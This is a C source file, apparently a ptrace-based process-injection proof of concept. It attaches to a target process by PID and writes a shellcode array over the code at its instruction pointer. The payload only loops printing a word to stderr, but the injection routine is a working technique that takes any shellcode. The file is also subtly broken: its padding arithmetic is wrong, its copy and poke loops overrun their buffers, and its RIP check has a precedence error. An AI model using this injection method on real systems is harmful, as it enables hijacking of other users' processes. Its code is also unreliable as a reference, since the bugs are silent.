#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

#ifdef __x86_64__
#	define WORD_BYTES 8
#else
#	define WORD_BYTES 4
#endif
#define WORD_CTYPE unsigned long // long always defaults to the size of processor's word

struct padded_shellcode {
	WORD_CTYPE *shellcode;
	int size;
};

unsigned char while_print[] = {
  0xeb, 0x12, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x02, 0x00, 0x00, 0x00,
  0x5e, 0xba, 0x06, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xe9, 0xff, 0xff,
  0xff, 0x63, 0x75, 0x6c, 0x6f, 0x21, 0x0a
};

unsigned int while_print_len = 31;

void pad_shellcode(unsigned char *shellcode, int len, struct padded_shellcode *dst) {
	int padded_len;
	if (len % WORD_BYTES == 0)  {
		dst->shellcode = (WORD_CTYPE *) shellcode;
		dst->size = len;
	} else {
		padded_len = len + len % WORD_BYTES;
		dst->shellcode = (WORD_CTYPE *) malloc(padded_len);
		memcpy(dst->shellcode, shellcode, padded_len);
		dst->size = padded_len;
	}
}

int main(int argc, char **argv) {
	int i;
	pid_t pid;
	struct user_regs_struct reg_data;
	long long int pokeaddr;
	struct padded_shellcode padded;
	if (argc != 2) {
		printf("Usage: ptrace_poc PID\n");
		exit(1);
	}
	pid = atoi(argv[1]);
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
		printf("[-] Unable to attach to %d\n", pid);
		exit(1);
	}
	printf("[+] Successfully attached to %d\n", pid);
	waitpid(pid, NULL, 0);
	ptrace(PTRACE_GETREGS, pid, NULL, &reg_data);
	if (reg_data.rip & 0xffffffff == 0xffffffff) {
		printf("[-] RIP looks broken\n");
		exit(1);
	}
	printf("[+] Got reg data\n[+] RIP is at %016llx\n[+] Injecting code...\n", reg_data.rip);
	pad_shellcode(while_print, while_print_len, &padded);
	for (i = 0, pokeaddr = reg_data.rip; i < padded.size; i++, pokeaddr += WORD_BYTES) {
		ptrace(PTRACE_POKETEXT, pid, pokeaddr, padded.shellcode[i]);
	}
	printf("[+] Code injected, detaching...\n");
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

